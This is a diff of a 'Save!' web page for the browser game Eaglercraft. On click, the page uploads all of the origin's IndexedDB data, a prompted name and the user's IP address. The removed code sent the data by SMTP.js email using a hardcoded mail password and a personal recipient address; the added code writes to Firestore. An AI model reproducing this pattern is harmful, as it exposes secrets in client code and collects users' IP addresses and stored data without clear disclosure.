@@ -4,18 +4,34 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Save!</title>
-  <!-- Load SMTP.js library -->
-  <script src="https://smtpjs.com/v3/smtp.js"></script>
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
 </head>
 <body>
   <h1>Save!</h1>
   <p>if you want to get this, talk to me</p>
 
-  <!-- Button to trigger IndexedDB export and email -->
-  <button id="send-indexeddb">save</button>
+  <!-- Button to trigger IndexedDB export and Firebase save -->
+  <button id="save-indexeddb">save</button>
 
   <script>
-  document.getElementById('send-indexeddb').addEventListener('click', async () => {
+  // Firebase project configuration
+  const firebaseConfig = {
+    apiKey: "AIzaSyCfmdai7FVjASJ1ECw_4kJ0xZIYNVNFxEI",
+    authDomain: "save-eaglercraft.firebaseapp.com",
+    projectId: "save-eaglercraft",
+    storageBucket: "save-eaglercraft.firebasestorage.app",
+    messagingSenderId: "743915611429",
+    appId: "1:743915611429:web:d06124b6271b68eeb626cc",
+    measurementId: "G-1SLTTMW0LQ"
+  };
+
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.firestore();
+
+  document.getElementById('save-indexeddb').addEventListener('click', async () => {
     // Prompt for user's name
     const userName = prompt("Please enter your name:", "") || 'Unknown';
 
@@ -39,22 +55,22 @@
       await new Promise((resolve, reject) => {
         const req = indexedDB.open(name);
         req.onsuccess = () => {
-          const db = req.result;
-          const tx = db.transaction(db.objectStoreNames, 'readonly');
-          const stores = Array.from(db.objectStoreNames);
+          const indexDB = req.result;
+          const tx = indexDB.transaction(indexDB.objectStoreNames, 'readonly');
+          const stores = Array.from(indexDB.objectStoreNames);
           Promise.all(stores.map(storeName =>
             new Promise((res, rej) => {
-              const getAll = tx.objectStore(storeName).getAll();
-              getAll.onsuccess = () => res({ storeName, data: getAll.result });
-              getAll.onerror = () => rej(getAll.error);
+              const getAllReq = tx.objectStore(storeName).getAll();
+              getAllReq.onsuccess = () => res({ storeName, data: getAllReq.result });
+              getAllReq.onerror = () => rej(getAllReq.error);
             })
           ))
           .then(results => {
             allData[name] = {};
-            for (const { storeName, data } of results) {
+            results.forEach(({ storeName, data }) => {
               allData[name][storeName] = data;
-            }
-            db.close();
+            });
+            indexDB.close();
             resolve();
           })
           .catch(err => reject(err));
@@ -63,32 +79,19 @@
       });
     }
 
-    // Serialize to JSON and encode
-    const json = JSON.stringify(allData, null, 2);
-    const base64 = btoa(unescape(encodeURIComponent(json)));
-    const dataUrl = 'data:application/json;base64,' + base64;
-
-    // Send email via SMTP.js
-    Email.send({
-      Host: "mail.quoggy.com",          // SMTP host
-      Port: 587,                         // SMTP port (SSL)
-      SSL: true,                         // Use SSL/TLS
-      Username: "save@quoggy.com",     // Your email address
-      Password: "_,@^{Dg5m@C7",        // Your email password (visible in source)
-      To: "mitchfogler@gmail.com",     // Recipient
-      From: "save@quoggy.com",         // Sender
-      Subject: "Eaglercraft World Export",
-      Body: `User Name: ${userName}<br>IP Address: ${ip}`,
-      Attachments: [
-        { name: "world.json", path: dataUrl }
-      ]
-      UseTLS: true
-    }).then(response => {
+    // Save to Firestore
+    try {
+      await db.collection('eaglercraft_worlds').add({
+        name: userName,
+        ipAddress: ip,
+        data: allData,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      });
       alert('success');
-    }).catch(err => {
-      console.error('error:', err);
-      alert('failure');
-    });
+    } catch (err) {
+      console.error('Error saving to Firebase:', err);
+      alert('fail');
+    }
   });
   </script>
 </body>
